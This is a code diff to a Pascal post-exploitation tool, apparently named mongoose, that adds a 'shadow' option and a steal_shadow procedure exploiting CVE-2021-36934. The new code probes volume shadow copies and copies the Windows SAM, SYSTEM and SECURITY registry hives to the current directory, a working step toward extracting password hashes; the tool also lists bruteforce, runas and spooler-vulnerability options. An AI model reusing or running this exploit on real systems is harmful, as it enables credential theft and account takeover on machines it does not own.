@@ -123,6 +123,7 @@ type
     procedure dns;virtual;
     procedure TXTvalueQuery;virtual;
     procedure spooler_vul; 
+    procedure steal_shadow;
   end;
 
 var
@@ -145,7 +146,7 @@ var
   ErrorMsg: String;
 begin
   // quick check parameters
-  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import remote ssl eval spooler', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce dns');
+  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import remote ssl eval spooler shadow', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce dns');
   if ErrorMsg<>'' then begin
     ShowException(Exception.Create(ErrorMsg));
     Terminate;
@@ -232,6 +233,10 @@ begin
   if hasoption('spooler') then begin
     spooler_vul;
   end;
+  if hasoption('shadow') then
+    begin 
+     steal_shadow;
+    end;
   if hasoption('m','mongoose') then begin
      systeminfo;
      userinfo;
@@ -481,6 +486,33 @@ begin
 end;
 
 end;
+procedure Tmongoose.steal_shadow;
+var 
+i : integer;
+is_valid: Boolean;
+shadow_path,sam,system,security : string; 
+Author : string;
+begin 
+Author := '[+] CVE-2021-36934 Exploitation '#10; 
+Author += '[!] Disclosed by : @jonasLyk'#10;
+Author += '[!] Modified by 0xsp(SRD) @zux0x3a '#10;
+WriteLn(Author);
+shadow_path := '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'; 
+sam := '\Windows\System32\config\SAM';
+system := '\Windows\system32\config\SYSTEM';
+security := '\Windows\system32\config\SECURITY';
+
+
+for i := 0 to 10 do begin 
+is_valid := FileExists(shadow_path+inttostr(i)+sam); 
+if is_valid = True then
+  begin 
+  copyfile(shadow_path+inttostr(i)+sam,GetCurrentDir+'\SAM');
+  CopyFile(shadow_path+inttostr(i)+system,GetCurrentDir+'\SYSTEM');
+  CopyFile(shadow_path+inttostr(i)+security,GetCurrentDir+'\SECURITY');
+  end;
+end; 
+end; 
 function mass_spooler_vuln_scan(file_n:string):string;
 var 
 host_list : Tstringlist;
@@ -520,7 +552,6 @@ writeln('[+]'+sMachine+'-'+' is NOT vulnerable')
  sMachines := ParamStr(i+1);
  mass_spooler_vuln_scan(sMachines);
  end;
-
   end;
   
 end;
@@ -1702,6 +1733,25 @@ begin
   Application.Run;
   Application.Free;
 end.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
  
  
  
